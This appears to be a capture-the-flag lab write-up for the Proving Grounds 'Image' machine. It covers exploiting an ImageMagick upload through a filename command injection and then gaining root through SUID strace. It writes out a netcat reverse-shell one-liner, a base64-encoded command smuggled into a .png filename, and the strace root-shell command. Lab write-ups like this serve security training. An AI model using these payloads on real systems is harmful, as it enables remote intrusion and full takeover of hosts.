---
layout: default
title: Image
parent: Proving Grounds Practice - Linux
nav_order: 18
---

# Scanning

---

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/image]
└─$ sudo nmap -Pn -p- -sC -sV -T4 --open 192.168.181.178

Nmap scan report for 192.168.181.178

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)

80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: ImageMagick Identifier
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.82 seconds

```

# Enumeration

---

## HTTP | 80

There is ImageMagick image upload running on port 80.

Gobuster does not return any other directories or files.

Research for exploits shows an issue reported to the ImageMagick Github.

[ImageMagick CVE-2016-5118 Explanation](https://github.com/ImageMagick/ImageMagick/issues/6339)

The explanation indicates that a regular .png file could be renamed with Base64 encoded reverse shell one-liner for a shell command injection exploit.

# Exploitation

---

Start by just creating a simple file named _en.png_

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/image]
└─$ echo -ne test > en.png

┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/image]
└─$ cat en.png
test

```

Generate a netcat mkfifo reverse shell one-liner.

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.217 9001 >/tmp/f
```

Base64 encode.

```bash
cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDE5Mi4xNjguNDUuMjE3IDkwMDEgPi90bXAvZg==
```

Then rename (copy) the _en.png_ file with the base64 encoded payload.

```bash
cp en.png '|en"`echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDE5Mi4xNjguNDUuMjE3IDkwMDEgPi90bXAvZg== | base64 -d | bash`".png

┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/image]
└─$ cp en.png '|en"`echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDE5Mi4xNjguNDUuMjE3IDkwMDEgPi90bXAvZg== | base64 -d | bash`".png'

┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/image]
└─$ ls
'|en"`echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDE5Mi4xNjguNDUuMjE3IDkwMDEgPi90bXAvZg== | base64 -d | bash`".png'
 en.png


```

Upload the file and get a reverse shell.

![upload](../../../assets/images/ctfs/proving_grounds/image/upload.png)

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PRACTICE/image]
└─$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [192.168.45.217] from (UNKNOWN) [192.168.181.178] 41446
sh: 0: can't access tty; job control turned off
$ whoami
www-data

```

# Post-Exploitation

---

## Check SUID Permissions

Checking SUID permissions for interesting binaries we see _strace_

```bash
www-data@image:/var/www/html$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/bin/strace
/usr/bin/fusermount
/usr/bin/sudo
/usr/bin/su
/usr/bin/umount

```

Checking GTFO Bins we see the following:

![gtfo](../../../assets/images/ctfs/proving_grounds/image/gtfo.png)

```bash
www-data@image:/var/www/html$ /usr/bin/strace -o /dev/null /bin/sh -p
/usr/bin/strace -o /dev/null /bin/sh -p
# whoami
whoami
root

```
